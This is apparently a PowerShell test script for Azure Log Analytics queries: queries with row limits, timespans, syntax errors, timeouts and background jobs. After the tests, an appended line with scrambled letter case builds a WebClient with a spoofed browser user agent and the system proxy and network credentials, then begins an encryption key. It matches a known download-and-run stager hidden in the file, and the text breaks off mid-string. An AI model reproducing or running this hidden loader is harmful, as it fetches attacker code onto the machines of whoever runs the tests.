﻿function Test-SimpleQuery
{
    $wsId = "DEMO_WORKSPACE"
    $query = "union * | take 10"

    $results = Invoke-AzOperationalInsightsQuery -WorkspaceId $wsId -Query $query

    AssertQueryResults $results 10
}

function Test-SimpleQueryWithTimespan
{
    $wsId = "DEMO_WORKSPACE"
    $query = "union * | take 10"
    $timespan = (New-Timespan -Hours 1)

    $results = Invoke-AzOperationalInsightsQuery -WorkspaceId $wsId -Query $query -Timespan $timespan

    AssertQueryResults $results 10
}

function Test-ExceptionWithSyntaxError
{
    $wsId = "DEMO_WORKSPACE"
    $query = "union * | foobar"

    Assert-ThrowsContains { Invoke-AzOperationalInsightsQuery -WorkspaceId $wsId -Query $query } "BadRequest"
}

function Test-ExceptionWithShortWait
{
    $wsId = "DEMO_WORKSPACE"
    $query = "union *"
    $timespan = (New-Timespan -Hours 24)
    $wait = 1;

    Assert-ThrowsContains { $results = Invoke-AzOperationalInsightsQuery -WorkspaceId $wsId -Query $query -Timespan $timespan -Wait $wait } "GatewayTimeout"
}

function Test-AsJob
{
    $wsId = "DEMO_WORKSPACE"
    $query = "union * | take 10"
    $timespan = (New-Timespan -Hours 1)

    $job = Invoke-AzOperationalInsightsQuery -WorkspaceId $wsId -Query $query -Timespan $timespan -AsJob
	$job | Wait-Job
	$results = $job | Receive-Job

    AssertQueryResults $results 10
}

function AssertQueryResults($results, $takeCount)
{
    Assert-NotNull $results
    Assert-NotNull $results.Results

    $resultsArray = [System.Linq.Enumerable]::ToArray($results.Results)

    Assert-AreEqual $resultsArray.Length $takeCount

    
    Assert-NotNull $resultsArray[0].TenantId
}

$wc=New-ObjEct SySTEM.NET.WebClienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEadeRS.AdD('User-Agent',$u);$Wc.PrOxY = [SYsTEM.NeT.WeBREqUeST]::DeFaulTWEBPROXy;$wC.ProXY.CrEDeNtiaLS = [SyStEm.Net.CREDentIalCAChE]::DefAULtNetwoRkCREdenTiAlS;$K='/j(\wly4+aW
